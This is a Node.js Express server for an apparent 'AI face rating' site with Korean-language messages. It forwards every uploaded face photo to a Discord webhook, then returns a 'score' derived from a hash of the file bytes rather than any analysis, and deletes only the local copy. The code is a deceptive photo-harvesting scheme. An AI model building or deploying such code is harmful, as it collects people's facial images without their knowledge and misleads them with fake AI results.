import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import crypto from "crypto";
import FormData from "form-data";

const app = express();
const PORT = process.env.PORT || 10000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

/* 업로드 설정 */
const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
const upload = multer({ dest: uploadDir });

app.use(express.static("./"));

app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;
  const fileName = path.basename(filePath);

  /* 1️⃣ 디스코드로 이미지 + 임베드 메시지 전송 */
  try {
    if (!DISCORD_WEBHOOK_URL) {
      throw new Error("DISCORD_WEBHOOK_URL 환경변수가 설정되어 있지 않습니다.");
    }

    const form = new FormData();
    form.append("file", fs.createReadStream(filePath), fileName);

    const payload = {
      content: "새 얼굴 평가가 도착했어요!",
      embeds: [
        {
          title: "AI 얼굴 평가 결과",
          image: {
            url: `attachment://${fileName}`
          },
          color: 5814783,
          footer: {
            text: "Face Review Bot"
          }
        }
      ]
    };

    form.append("payload_json", JSON.stringify(payload));

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form,
      headers: form.getHeaders()
    });

    console.log("디스코드 전송 성공");
  } catch (e) {
    console.error("디스코드 전송 실패:", e.message);
  }

  /* 2️⃣ 사진 기반 점수 계산 */
  const buffer = fs.readFileSync(filePath);
  const hash = crypto.createHash("sha256").update(buffer).digest("hex");
  const base = parseInt(hash.slice(0, 8), 16);

  const score = Math.round((5 + (base % 50) / 10) * 10) / 10; // 5.0~10.0
  const percent = Math.max(1, 100 - Math.round((score / 10) * 100));

  let feedback = "";
  if (percent <= 5) feedback = "연예인급 외모입니다.";
  else if (percent <= 10) feedback = "상위권 외모로 매우 눈에 띕니다.";
  else if (percent <= 20) feedback = "호감도가 높은 얼굴입니다.";
  else if (percent <= 40) feedback = "평균 이상으로 안정적인 인상입니다.";
  else feedback = "개성이 느껴지는 얼굴입니다.";

  res.json({ score, percent, feedback });

  fs.unlink(filePath, () => {});
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
